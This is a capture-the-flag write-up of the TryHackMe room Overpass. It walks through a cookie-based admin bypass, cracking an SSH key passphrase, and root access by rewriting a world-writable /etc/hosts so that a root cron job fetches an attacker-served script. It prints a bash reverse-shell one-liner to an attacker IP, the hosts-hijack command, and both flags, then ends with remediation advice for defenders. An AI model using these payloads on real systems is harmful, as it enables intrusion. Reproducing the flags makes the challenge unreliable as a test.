# Overpass — TryHackMe — Easy — Crypto/Misc

**Date Completed:** 27 Sep 2026
**Time to Root:** ~1 hour
**User Flag:** `thm{65c1aaf000506e56996822c6281e6bf7}`
**Root Flag:** `thm{7f336f8c359dbac18d54fdd64ea753bb}`

---

## Executive Summary

Overpass is a "password manager" web application with a fundamentally broken authentication scheme: the admin panel's session check relies entirely on the mere presence of a `SessionToken` cookie, with no server-side validation of its actual value. This allowed complete authentication bypass, exposing an encrypted SSH private key. After cracking the key's passphrase and gaining SSH access, a world-writable `/etc/hosts` file combined with a root-owned cron job fetching a script over HTTP allowed full privilege escalation to root via a classic DNS-hijack-and-serve-malicious-payload technique.

---

## Scope and Methodology

- **Target IP:** 10.82.150.32
- **Platform:** TryHackMe
- **Category:** Crypto/Misc
- **Methodology:** Reconnaissance — Enumeration — Exploitation — Privilege Escalation

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sV -sC -T4 10.82.150.32
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 8.2p1 (Ubuntu) | Used post-exploitation with cracked SSH key |
| 80 | HTTP | Golang net/http server | Hosts the "Overpass" password manager site |

---

## Enumeration

Directory enumeration revealed `/admin`, `/downloads`, and several static JS/CSS assets:
```bash
gobuster dir -u http://10.82.150.32 -w /usr/share/wordlists/dirb/common.txt
```

Reading `/login.js` revealed the client-side authentication logic:
```javascript
const response = await postData("/api/login", creds)
const statusOrCookie = await response.text()
if (statusOrCookie === "Incorrect credentials") {
    // show error
} else {
    Cookies.set("SessionToken", statusOrCookie)
    window.location = "/admin"
}
```

Critically, nothing in this flow cryptographically signs or validates the cookie's contents beyond its mere existence — the `/admin` page appears to check only whether *a* `SessionToken` cookie is present, not whether it corresponds to a real, verified session.

The `/downloads` page also revealed a `buildscript.sh` and `overpass.go` source file, later relevant to the privilege escalation stage.

---

## Exploitation

**Vulnerability Class:** Broken Authentication — Client-Controlled Session State (CWE-287 / CWE-565: Reliance on Cookies without Validation)

Set an arbitrary `SessionToken` cookie manually via the browser console on the `/admin` page:
```javascript
document.cookie = "SessionToken=anything"
```

Reloading the page granted full access to the admin area with zero valid credentials, revealing:
- A message addressed to a user named **James**
- An **encrypted RSA private key** (AES-128-CBC), left directly in the admin panel

Saved the key locally and converted it for cracking:
```bash
ssh2john ~/overpass_id_rsa > overpass.hash
john overpass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Cracked passphrase: **`james13`**

Used the decrypted key to authenticate via SSH:
```bash
ssh -i ~/overpass_id_rsa james@10.82.150.32
```

This granted a full shell as `james` and access to the user flag.

---

## Privilege Escalation

**Vulnerability Class:** Insecure Cron Job Fetching Remote Script over Plain HTTP + World-Writable `/etc/hosts` (CWE-494: Download of Code Without Integrity Check)

Inspected the system crontab:
```bash
cat /etc/crontab
```

Found a root-owned cron job running every minute:
root curl overpass.thm/downloads/src/buildscript.sh | bash

This job fetches a script over plain HTTP using a hostname (`overpass.thm`) rather than a hardcoded IP, and pipes the response directly into `bash` — with no signature verification, integrity check, or HTTPS.

Checked `/etc/hosts` permissions:
```bash
ls -la /etc/hosts
```
Result: world-writable (`rw-rw-rw-`).

Since DNS resolution for `overpass.thm` could be fully controlled by editing this file, the domain was redirected to a Kali-hosted web server:
```bash
echo "192.168.132.248 overpass.thm" >> /etc/hosts
```
(An existing conflicting entry for `overpass.thm` pointing to localhost had to be removed first, since `/etc/hosts` resolves the first matching entry.)

On the attacking machine, a malicious `buildscript.sh` was placed at the exact expected path and served over HTTP:
```bash
mkdir -p ~/www/downloads/src
echo 'bash -i >& /dev/tcp/192.168.132.248/4444 0>&1' > ~/www/downloads/src/buildscript.sh
cd ~/www && sudo python3 -m http.server 80
```

A netcat listener was started to catch the resulting connection:
```bash
nc -lvnp 4444
```

Within the next minute, the cron job executed, fetched the malicious script from the redirected hostname, and ran it as root — returning a fully privileged reverse shell.

---

## Proof of Completion

User: thm{65c1aaf000506e56996822c6281e6bf7}
Root: thm{7f336f8c359dbac18d54fdd64ea753bb}


---

## Vulnerability Analysis

| Finding | Severity | CVSS | MITRE ATT&CK | CWE |
|---------|----------|------|--------------|-----|
| Broken authentication via unvalidated session cookie | Critical | 9.1 | T1565 (Data Manipulation) | CWE-287 / CWE-565 |
| Encrypted SSH key exposed to unauthenticated (bypassed) users | High | 7.5 | T1552 (Unsecured Credentials) | CWE-522 |
| Root cron job fetching remote script with no integrity verification, over plain HTTP, combined with a world-writable /etc/hosts | Critical | 9.8 | T1053.003 (Scheduled Task/Job: Cron) | CWE-494 |

---

## Remediation

1. **Implement real server-side session validation.** Sessions must be verified against a server-side store or a properly signed/cryptographically-verifiable token (e.g., a signed JWT) — never trust a client-supplied cookie's mere presence as proof of authentication.
2. **Never expose private keys, even encrypted ones, through any web-accessible interface.** If SSH key distribution is genuinely needed, use a secure, authenticated, out-of-band channel.
3. **Fix `/etc/hosts` permissions.** This file should never be writable by non-root users; if it is, any user can hijack hostname resolution used by privileged processes.
4. **Never pipe remotely-fetched scripts directly into a shell**, especially not over plain HTTP and especially not as part of a root-owned scheduled task. At minimum, use HTTPS with certificate validation and verify a cryptographic signature or checksum before execution.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service detection |
| Gobuster | Directory/content discovery |
| Browser DevTools (Console) | Cookie manipulation to bypass authentication |
| ssh2john / John the Ripper | Cracking the encrypted RSA private key's passphrase |
| OpenSSH | Authenticated access using the cracked key |
| Python's http.server | Serving the malicious payload for the cron job to fetch |
| Netcat | Catching the resulting root-level reverse shell |

---

## Lessons Learned

- This machine is a strong, realistic illustration of "homegrown" authentication gone wrong — using a cookie's mere existence as proof of a valid session, rather than validating a real server-issued, unforgeable token, completely defeats the purpose of authentication.
- `/etc/hosts` being world-writable is a serious, often-overlooked privilege escalation vector: any process (even a low-privilege one) can silently redirect where a root-owned automated task fetches code from, turning a scheduled maintenance task into a root-level backdoor.
- Automated build/update systems that fetch and execute remote code should always verify what they're running — a checksum, a cryptographic signature, or at minimum a pinned IP address over HTTPS would have fully closed this privilege escalation path.

